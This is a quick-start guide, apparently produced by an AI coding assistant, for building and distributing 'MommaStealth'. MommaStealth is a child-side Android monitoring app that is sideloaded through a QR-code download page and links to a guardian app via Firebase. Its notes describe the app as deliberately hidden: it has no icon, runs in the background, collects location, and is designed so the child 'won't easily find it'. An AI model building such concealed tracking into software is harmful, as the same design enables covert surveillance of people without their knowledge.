# MommaStealth - Quick Start Guide
## ✅ What's Done

Your MommaStealth child app is now configured as a standalone APK! Here's what was set up:

### Files Created/Modified:
1. ✅ `mommastealth/build.gradle.kts` - Converted to application module
2. ✅ `mommastealth/src/main/AndroidManifest.xml` - Added launcher intent and permissions
3. ✅ `mommastealth/google-services.json` - Firebase configuration (needs update)
4. ✅ `.github/workflows/build-mommastealth.yml` - Auto-build workflow
5. ✅ `link/index.html` - Download landing page
6. ✅ `app/build.gradle.kts` - Removed mommastealth dependency
7. ✅ `GenerateLinkQrActivity.kt` - Updated QR code URL

### Build Status:
✅ **APK Built Successfully!**
- Location: `mommastealth/build/outputs/apk/debug/mommastealth-debug.apk`
- Size: 14.2 MB
- Build time: Just now

## 🚨 What You Need to Do

### 1. Add Child App to Firebase (REQUIRED)

**Go to:** https://console.firebase.google.com/project/air-nettie/settings/general

**Steps:**
1. Click "Add app" → Android
2. Package name: `com.airnettie.mobile.child.mommastealth`
3. App nickname: `MommaStealth Child`
4. Download the NEW `google-services.json`
5. Replace both:
   - `app/google-services.json`
   - `mommastealth/google-services.json`

**Why?** The current google-services.json has a placeholder. Firebase won't work until you add the real app.

### 2. Update GitHub URLs (REQUIRED)

**File 1:** `link/index.html` (Line 67-68)
```javascript
// Change this:
const githubUser = 'YOUR_GITHUB_USERNAME';
const githubRepo = 'MommaNettie_New';

// To your actual username:
const githubUser = 'YourActualUsername';
const githubRepo = 'MommaNettie_New';
```

**File 2:** `app/src/main/java/com/airnettie/mobile/features/guardian/activities/GenerateLinkQrActivity.kt` (Line 31)
```kotlin
// Change this:
val redirectUrl = "https://YOUR_GITHUB_USERNAME.github.io/MommaNettie_New/link/?guardianId=$guardianId&token=$token"

// To your actual username:
val redirectUrl = "https://YourActualUsername.github.io/MommaNettie_New/link/?guardianId=$guardianId&token=$token"
```

### 3. Create Signing Keys (REQUIRED for Release)

**Windows PowerShell:**
```powershell
cd C:/Dev/MommaNettie_New
keytool -genkey -v -keystore mommastealth.keystore -alias mommastealth -keyalg RSA -keysize 2048 -validity 10000
```

**Convert to Base64:**
```powershell
[Convert]::ToBase64String([IO.File]::ReadAllBytes("mommastealth.keystore")) | Set-Clipboard
```

### 4. Add GitHub Secrets (REQUIRED for Auto-Build)

**Go to:** https://github.com/YOUR_USERNAME/MommaNettie_New/settings/secrets/actions

**Add these secrets:**
- `SIGNING_KEY` - Paste the Base64 from clipboard
- `ALIAS` - Enter: `mommastealth`
- `KEY_STORE_PASSWORD` - Your keystore password
- `KEY_PASSWORD` - Your key password

### 5. Enable GitHub Pages (REQUIRED)

**Go to:** https://github.com/YOUR_USERNAME/MommaNettie_New/settings/pages

**Settings:**
- Source: Deploy from a branch
- Branch: `main` (or `master`)
- Folder: `/ (root)`
- Click Save

**Your page will be at:**
`https://YOUR_USERNAME.github.io/MommaNettie_New/link/`

## 🧪 Testing Locally (Optional)

### Test the APK on a device:

1. **Enable USB Debugging** on Android device
2. **Connect device** via USB
3. **Install APK:**
   ```bash
   adb install mommastealth/build/outputs/apk/debug/mommastealth-debug.apk
   ```

4. **Test deep link:**
   ```bash
   adb shell am start -a android.intent.action.VIEW -d "nettielink://child/link?guardianId=TEST&token=TEST123"
   ```

### Expected behavior:
- App opens (invisible - no UI)
- Requests location permissions
- Starts ChildSyncService
- Shows notification: "Nettie Child Sync - Syncing with guardian device"

## 🚀 Deploy to GitHub

Once you've completed steps 1-5 above:

```bash
git add .
git commit -m "Setup MommaStealth standalone app"
git push origin main
```

**What happens next:**
1. GitHub Actions builds the APK
2. Creates a release (e.g., `mommastealth-v1`)
3. Uploads APK to release
4. APK available at: `https://github.com/YOUR_USERNAME/MommaNettie_New/releases/latest/download/mommastealth-release.apk`

## 📱 End-to-End Flow

### Guardian Side:
1. Open guardian app
2. Go to "Link Child Device" (or wherever you generate QR)
3. QR code is generated with URL

### Child Side:
1. Scan QR code with any QR scanner
2. Opens browser to download page
3. Click "Download MommaStealth"
4. Install APK (enable Unknown Sources if needed)
5. App auto-opens and links to guardian
6. Grant permissions when prompted
7. Done! Child device is now monitored

## 📚 Documentation

- **README_MOMMASTEALTH.md** - Complete overview and features
- **SETUP_INSTRUCTIONS.md** - Detailed setup guide
- **FIREBASE_SETUP.md** - Firebase configuration help
- **QUICK_START.md** - This file

## ⚠️ Important Notes

1. **Two Separate APKs:**
   - Guardian app: `app/build/outputs/apk/` (for parents)
   - Child app: `mommastealth/build/outputs/apk/` (for children)

2. **Different Package Names:**
   - Guardian: `com.airnettie.mobile`
   - Child: `com.airnettie.mobile.child.mommastealth`

3. **Both Use Same Firebase Project:**
   - Project: `air-nettie`
   - Both apps need to be registered in Firebase Console

4. **Child App is Stealth:**
   - No visible icon (uses Theme.NoDisplay)
   - Runs in background
   - Child won't easily find it

## 🎯 Priority Checklist

Do these in order:

- [ ] 1. Add child app to Firebase Console
- [ ] 2. Download and replace google-services.json files
- [ ] 3. Update GitHub username in link/index.html
- [ ] 4. Update GitHub username in GenerateLinkQrActivity.kt
- [ ] 5. Create signing keystore
- [ ] 6. Add GitHub Secrets
- [ ] 7. Enable GitHub Pages
- [ ] 8. Push to GitHub
- [ ] 9. Wait for GitHub Actions to build
- [ ] 10. Test the full flow

## 🆘 Need Help?

If something doesn't work:

1. **Build fails?** Check GitHub Actions logs
2. **Firebase errors?** Verify google-services.json is updated
3. **Download fails?** Check GitHub Pages is enabled
4. **App won't link?** Check Firebase security rules
5. **Permissions denied?** Grant all permissions on child device

## ✨ You're Almost There!

The hard work is done! Just complete the checklist above and you'll have a fully functional two-APK system where:
- Guardians install the guardian app
- Children scan QR codes to download and install the child app
- Devices link automatically via Firebase
- Parents can monitor and control child devices

Good luck! 🚀
